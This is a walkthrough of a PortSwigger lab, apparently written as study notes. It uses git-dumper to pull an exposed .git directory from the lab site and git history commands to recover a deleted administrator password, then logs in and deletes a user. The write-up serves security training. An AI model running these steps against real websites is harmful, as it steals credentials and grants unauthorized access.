---
Category: Information disclosure
LAB: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history
Difficulty: Practitioner
---
---

This is the description of the lab

>This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete the user `carlos`.

Okay, let's start by going to `/robots.txt` 

![](../../../0.%20Assets/Information%20disclosure%20in%20version%20control%20history-1784474268688.webp)

Knowing we are talking about `version history` we can try looking for `git` files like `.git`

![](../../../0.%20Assets/Information%20disclosure%20in%20version%20control%20history-1784474687663.webp)

Bingo, let's look inside files and directories for credentials

An interesting directory might be `logs`

![](../../../0.%20Assets/Information%20disclosure%20in%20version%20control%20history-1784474886145.webp)

traversing the directory we can find these logs

![](../../../0.%20Assets/Information%20disclosure%20in%20version%20control%20history-1784474959583.webp)

now that we know which commit was the one the commit we need we will download the git repo

Install `git-dumper`:

```
py -m pip install git-dumper
```

Temporarily add its scripts directory to `PATH`:

```
$env:Path += ";C:\Users\<your user>\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\Scripts"
```

Download the exposed `.git` directory:

```
git-dumper https://YOUR-LAB.web-security-academy.net/.git/ lab-git
cd lab-git
```

> Include `/.git/` at the end of the URL.

### 3. View the commit history

```
git log
```

In this case:

```
3a86a7674e839f8577e0429d969dc94320db2228 — Remove admin password from config
cacff6247842088d4f8a2f724655f7d3b18cd893 — Add skeleton admin panel
```

### 4. Recover the deleted password

Show the commit that removed the password:

```
git show 3a86a7674e839f8577e0429d969dc94320db2228
```

![](../../../0.%20Assets/Information%20disclosure%20in%20version%20control%20history-1784476221002.webp)

and now we can log in with the credentials we found

![](../../../0.%20Assets/Information%20disclosure%20in%20version%20control%20history-1784476258472.webp)

And delete the user `Carlos`

![](../../../0.%20Assets/Information%20disclosure%20in%20version%20control%20history-1784476282259.webp)

